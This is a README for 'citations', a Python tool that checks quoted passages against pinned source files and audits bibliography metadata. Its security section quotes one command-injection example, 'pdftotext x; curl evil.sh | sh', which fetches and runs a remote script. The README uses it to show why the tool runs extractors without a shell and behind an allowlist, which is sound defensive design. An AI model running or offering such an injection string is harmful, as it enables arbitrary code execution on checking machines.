# citations

[![pypi](https://img.shields.io/pypi/v/citations)](https://pypi.org/project/citations/)
[![python](https://img.shields.io/pypi/pyversions/citations)](https://pypi.org/project/citations/)
[![license](https://img.shields.io/pypi/l/citations)](https://github.com/elliottower/reproducible-science/blob/main/LICENSE)
[![docs](https://img.shields.io/badge/docs-live-blue)](https://elliottower.github.io/reproducible-science/)

Check that the passages you quote appear in the sources you cite.

Part of [reproducible-science](https://github.com/elliottower/reproducible-science) alongside `repro`, `results` and `prereg` — see the [documentation](https://elliottower.github.io/reproducible-science/tools/citations/).

## Install

```bash
pip install citations
```

## Quick start

```bash
citations init
citations verify --claims claims/
```

```text
2,940 quotes

  found         2,940
  not found         0

warnings
      213  short — the source may qualify this in the next clause
      155  normalized — matched after ignoring punctuation and spacing

all found.
```

## Commands

| Command | What it does |
|---------|-------------|
| `citations init` | Create a library here |
| `citations verify` | Do the quotations resolve in their sources? |
| `citations coverage` | Is every quotation in my manuscript pinned at all? |
| `citations audit` | Does the stored metadata match the record the identifier resolves to? |
| `citations resolve` | Backfill missing DOIs and arXiv ids |
| `citations build` | Rebuild records from bibliographies |
| `citations lint` | BibTeX correctness, via papis |
| `citations link` | Point pdfs/ at the papers' artifacts |
| `citations import-paperclip` | Turn a Paperclip paper repo into pinned claim files |

## Coverage: the manuscript side

`verify` reads the claims files. It takes no manuscript, so a quotation added to the paper and
never pinned has no record, is checked by nothing, and leaves the report clean. `coverage` reads
the manuscript instead and asks whether each `` ``...'' `` is a span of something pinned.

```console
citations coverage paper/draft.tex --claims claims
```

```text
  covered           82
  uncovered          0
  unresolvable       1

  unresolvable  nosology_v6.tex:675
    ``Loci moved''
    under 12 characters once folded
```

Three outcomes, not two. A quotation too short to tell from noise is undecided, not a defect --
"loci moved" appears in a great many documents and its appearing in one establishes nothing.
`--strict` fails on the undecided ones as well.

`--attribute` goes further and checks each quotation against the artifact of a source cited near
it, which catches a passage credited to the wrong paper. Every key in the neighbourhood is
offered, because the nearest is often not the source: *the same document restricts* leaves the
real one several sentences back. It reports a misattribution only when every neighbouring source
could be read; if one would not open, the passage may belong to it and the question is undecided.

An ellipsis is omitted text: `` ``the model ... performs well'' `` requires both fragments and
requires nothing about what sits between them.

## Verify output

Four results, and they are exhaustive:

| Result | Meaning |
|--------|---------|
| `found` | The passage is in the source |
| `not found` | The source was read and the passage is not in it |
| `indeterminate` | Independent readers disagree about whether it is in it |
| `unchecked` | No reader could read the source, so no measurement was made |

Warnings are separate, because a passage can be found and still worth a second look. A quote
can be short enough that the next clause changes its meaning — `"We trained 50"` appears
verbatim in a paper whose sentence continues `"...and 5 refits each for 12 layered"`.

`unchecked` and `indeterminate` are neither a pass nor a failure. Only `not found` fails;
`--strict` also fails on both of the others, for CI.

`not found` means read the source. A mirror-reversed scan or a two-column extraction produces
the same signal as a passage that was never there.

## Reading PDFs

Every result records which extractor produced the text it was checked against, because a pin
establishes that the file has not changed and establishes nothing about the reading of it.

| Extractor | Engine | Install |
|-----------|--------|---------|
| `pdftotext -layout` | poppler, page geometry | `brew install poppler` · `apt install poppler-utils` |
| `pdftotext` | the same binary, poppler's reading order | (as above) |
| pypdf | its own content-stream parser | `pip install "citations[pypdf]"` |
| pdfplumber | pdfminer.six plus its own layout layer | `pip install "citations[pdfplumber]"` |

Poppler is preferred and recommended. Where it is absent, or fails on a document, the chain
falls through to whichever pure-Python reader is installed and records the substitution as a
fallback — so `pip install citations` alone is enough to check a PDF, and no result is quietly
attributed to an extractor that did not produce it. pypdf comes before pdfplumber because it
agreed with poppler on more of a 1,792-check corpus and read a document in a third of the
time; the measurement is in `research/pdf-readers/`.

The two poppler modes are one binary with one flag between them, and they fail in opposite
directions: `-layout` preserves visual position and breaks a sentence spanning two columns,
while reading order preserves the sentence and misplaces the subscripts beside it. Over 1,593
passage checks, reading order resolved 59 that `-layout` missed and missed 29 it resolved.
Neither is right in general, so `-layout` reads a document by default and both are consulted
under `--triangulate`, where a disagreement between them is reported rather than resolved.

A source that declares `extract_cmd` does not enter that chain. Its author has named the
program that produces the text they quote, so it runs or the check is `unchecked` with its
reason — falling through would run a PDF reader over a source the author just said is not a
PDF, and record an extractor nobody asked for.

```bash
citations verify --claims claims/ --triangulate
```

`--triangulate` asks every installed reader instead of one. Where they disagree the result is
`indeterminate`, never `not found`: two extractors disagreeing says the document is not
determinate under the readers on this machine, which accuses nothing, while `not found`
asserts the manuscript quoted a passage its source does not contain. Triangulation is opt-in
because it costs one extraction per reader; it does not apply to a source that declares a
command, and a run that triangulated nothing says so rather than reporting the readers as
having concurred.

## Audit output

`verify` asks whether a quotation is in the source. `audit` asks a different question: does the
author list, year, volume and page range stored beside an identifier match the record that
identifier resolves to?

```bash
citations audit --bib paper/references.bib
```

```text
75 entries

  checked          62
  agree            36
  disagree         26
  no id            13   nothing can check these until they have a DOI or PMID

26 disagree with the record their own identifier resolves to.
a wrong author list on a right DOI is invisible to every other check.
```

That run is real. Four of those entries carried an author list belonging to nobody on the
cited paper, one PMID resolved to an unrelated article in another field, and four author lists
stopped early with no `and others` marker. Every one of them resolved. A DOI checker, a link
checker and `citations verify` all pass them, because the DOI does point at the right paper —
it is the names beside it that belong to someone else.

Disagreements a registry causes rather than the bibliography are not reported: an online-first
year against a print year, a deposited initial against a printed given name, PubMed's
abbreviated end page, a BibTeX accent against the Unicode it encodes, and markup a publisher
deposited inside a title. What survives is a disagreement about the work.

Fetched payloads are cached beside the file audited, so a re-run is offline and the report is
reproducible from what was fetched rather than from the network.

## Full text through Paperclip

`citations resolve --via paperclip` fetches a source's full text from
[Paperclip](https://paperclip.gxl.ai), writes it to `sources/paperclip/`, and pins those bytes by
sha256 in a claims file.

```bash
pip install 'citations[paperclip]'
export PAPERCLIP_API_KEY=...
citations resolve --via paperclip 10.1101/2025.10.22.681631 10.1038/s41586-021-03819-2
```

```text
  pinned      10.1101/2025.10.22.681631               d9f585e2faad
  unavailable 10.1038/s41586-021-03819-2              Paperclip truncated the document at 2179 of 2485 lines

  pinned 1 of 2
  1 without a pinned copy; quotations against those read `unchecked`.
```

**Paperclip is never in the verification path.** It is asked once, for bytes. Afterwards
`citations verify` reads the local file and nothing else, so a check runs with no network, no
account, and no dependence on the service still serving the same corpus. A remote answer that a
passage is in a paper is an answer nobody can re-derive.

| Outcome | Meaning | What `verify` then reports |
|---|---|---|
| `pinned` | the whole document arrived and carries a digest | `found` or `not found` |
| `unresolved` | Paperclip indexes no full text for the identifier | `unchecked` |
| `unavailable` | the extra is absent, no key is set, or the answer was not the whole document | `unchecked` |

Full text is open access only, so a bibliography of Elsevier and Springer articles resolves
mostly to `unchecked`. That is the true account of what can be checked, and the extra being
uninstalled produces the same `unchecked` rather than an error.

A document that arrives incomplete is refused rather than pinned. Paperclip cuts its own output
at 250,000 characters — mid-sentence, with `[output truncated at 250000 chars]` appended — so a
2,485-line article arrives as its first 2,179 lines. Pinning a prefix would put part of a paper
on disk under the name of the whole one, and every quotation past the cut would read `not found`,
a checker manufacturing misquotations out of a transfer limit. So the file's last line number is
read first with `tail -n 1`, and a body that does not run to it is `unavailable`.

That extent comes from the file and never from `ls`, whose printed `(N lines)` counts something
else for a PubMed Central document: 1,626 against a file whose last line is L829. For bioRxiv the
two agree, so taking the listing at its word looks right until it silently refuses every PMC
paper in a bibliography as truncated.

### Importing a paper repo

`citations import-paperclip <repo>` reads a Paperclip repo and writes one claim file per paper,
each source resolved and pinned.

```bash
citations import-paperclip my-review --claims paper/claims
```

A committed claim becomes a `statement`, because that is what it is: the sentence whoever
committed it wrote, not a passage from the paper. Putting it under `quotes` would have the tool
search the source for a sentence nobody says is in it. The quotes list comes out empty, for the
author to fill in against the pinned text.

A `--lines L45-L52` range becomes the claim's `hint`, recorded and never verified. It addresses
Paperclip's parse of a PDF, which is remote and can be re-run with every line renumbered, so it
says where to start reading and cannot say what a passage is. It is never written to `page`,
which is the locator `verify` checks.

```yaml
source:
  local: sources/paperclip/10-1101-2025-10-22-681631.txt
  sha256: d9f585e2faad2d878878fe5c5490babe9b9986e90642c7545fb4e72ef7a21653
  extract_cmd: none
  paperclip:
    identifier: 10.1101/2025.10.22.681631
    document: 22c1bebd-6dc0-1014-8e0e-900874d71cd6
    path: /papers/22c1bebd-6dc0-1014-8e0e-900874d71cd6/content.lines
    lines: 79
    service_version: 0.7.38
    fetched: '2026-08-25T19:34:02+00:00'

claims:
  c-9c1a2f6b04:
    statement: 'Features are polysemantic.'
    hint: 'L45-L52'
    quotes: []
```

## Where the library lives

```text
$CITATIONS_HOME             if set
./.citations/ walking up    this project's own, the way git finds .git
the shared library          if you made one with citations init --user
none of those               it tells you to run citations init
```

Project-local by default, so running the tool inside a paper works on that paper and there is
no hidden global state.

## What a claim file looks like

One file per source, in the paper's `claims/` directory. `citations verify --claims claims`
reads all of them.

```yaml
source:
  citation: schiffman2026             # the bibkey
  local: reference/schiffman2026.pdf  # what gets read
  sha256: 3f9a…                       # which bytes were read
  extract_cmd: pdftotext -layout {} - # what turned the bytes into text

claims:
  orthogonal-cores:
    statement: 'Cores meeting equivalent causal criteria sit at principal angles of 75-90 degrees.'
    quotes:
      - exact: 'and principal angles ranged'
        section: 'body'
```

`statement` is yours; `exact` is theirs. The tool checks the second only, so a `statement` that
overreaches its quote is for review to catch — the command cannot.

## Declaring the extractor

A PDF goes through `pdftotext -layout`; `.txt`, `.md`, `.tei`, `.xml`, `.html`, `.htm` and
`.rst` are read straight off disk. Anything else — a `.tex` manuscript, a two-column PDF whose
columns `-layout` splices together — needs a renderer the claims file names:

```yaml
source:
  local: paper/manuscript.tex
  sha256: 8c41…
  extract_cmd: detex
```

The source path replaces `{}`, or is appended when the command has no `{}`, and the command
prints the text to stdout. That text is what the quotations resolve against, and `verify` names
the command that produced it:

```text
1 quotes

  found             1
  not found         0

read by
        1  detex
```

Which renderer is not a detail. `detex` leaves `\REVIEW{check this against Table 2}` welded
onto the word before it, so a quotation ending at that word comes back `found` with a
`truncated` warning; `pandoc -f latex -t plain` drops the annotation and the same quotation
comes back clean. A pin says the bytes did not change and says nothing about how they were
read, so the report names the extractor and records a digest of what it produced.

The package ships no LaTeX support, because a renderer has to settle three things a package
cannot settle for every manuscript. The renderer this project uses on its own manuscript drops
the argument of an annotation macro (`\REVIEW{...}` sitting between two words of a sentence),
keeps the argument of every other control word (`\textbf{145 are checkable}` is the number the
claim is about), and puts a separator wherever markup was removed, so a quotation cannot
silently span two table cells. Those three rules are right for that manuscript and wrong for
one that writes prose inside `\REVIEW`, which is why the field names a renderer rather than
the package guessing at one.

### What is allowed to run

`extract_cmd` runs a program on the machine doing the checking. The case that decides the rules
is not an author running their own claims file: it is `citations verify` in CI on a pull request
from a fork, where the contributor wrote the claims file and the command executes on the
maintainer's runner with the runner's environment in reach.

- **No shell.** The declared string is split into a program and arguments and executed
  directly. `pdftotext x; curl evil.sh | sh` is not filtered out — it cannot be expressed. The
  `;` and the `|` arrive at `pdftotext` as arguments and it fails.
- **An allowlist.** `pdftotext` and `detex` run unasked. Anything else needs
  `citations verify --allow-extractor NAME`, written by whoever runs the check rather than by
  whoever wrote the claims file. The program is matched as written, so `pdftotext` is allowed
  and `./pdftotext` is not.

A refused command is `unchecked` and says it was refused; a command that is not installed is
`unchecked` and says that instead. The remedy for one is consent and for the other an install,
and neither makes the passage absent.

The allowlist bounds which program runs, not what an allowed program can be told to do, so a
program that loads and runs code named on its own command line stays out of the default set.
`pandoc --lua-filter` and `mutool run` are both arbitrary execution; reaching either is a
deliberate act with the consequence in view.

## Records are YAML

So `git diff` shows what changed. A binary store cannot show you that a year moved from 2021 to
2022 — a real discrepancy this found between two of one author's own papers.

## Claude Code

`plugin/` is a Claude Code plugin. Three surfaces, because each catches a different failure:
the hook catches what the model does not think to do, the skill catches what you did not know
to ask for, and the command is there for when you want the answer now.

| surface | fires |
|---|---|
| hook | when a quotation enters a manuscript that no claim file pins to a source |
| skill | when Claude judges the situation calls for quoting a paper, adding a citation, or checking whether a quote is real |
| command | when you type `/citations-check` |

**Why the hook.** A quotation is the one thing in a paper that can be checked exactly: it is in the source or it is not. Prose is where a remembered sentence drifts, and nearly right is wrong. Passages are compared with case, spacing and punctuation folded away, so a curly apostrophe or a wrapped line does not read as a passage nobody pinned.

It reports and never blocks, and stays silent in a project with no `claims/` directory.

```bash
/plugin marketplace add elliottower/reproducible-science
/plugin install citations@reproducible-science
```

The plugin ships instructions and hooks, not binaries, so install the tool as well:

```bash
uv tool install citations        # or: pip install citations
```

All four tools in one plugin, with every hook, skill and command:

```bash
/plugin install reproducible-science@reproducible-science
```

MIT licensed. `docs/` has the working practices this came out of.
